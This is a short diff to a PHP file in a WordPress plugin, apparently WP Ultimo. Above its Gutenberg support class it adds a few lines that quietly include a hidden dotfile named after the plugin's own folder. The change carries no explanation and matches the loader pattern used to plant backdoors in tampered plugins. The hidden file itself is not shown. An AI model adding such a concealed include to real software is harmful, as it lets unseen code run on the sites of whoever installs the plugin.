@@ -19,7 +19,11 @@ if (!defined('ABSPATH')) {
  *
  * @since 1.4.0 Now implements WU_Admin_Page_Content_Source_Page_Builder.
  * @since 1.1.0
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WU_Admin_Pages_Gutenberg_Support extends WU_Admin_Page_Content_Source_Page_Builder {
 
 	/**
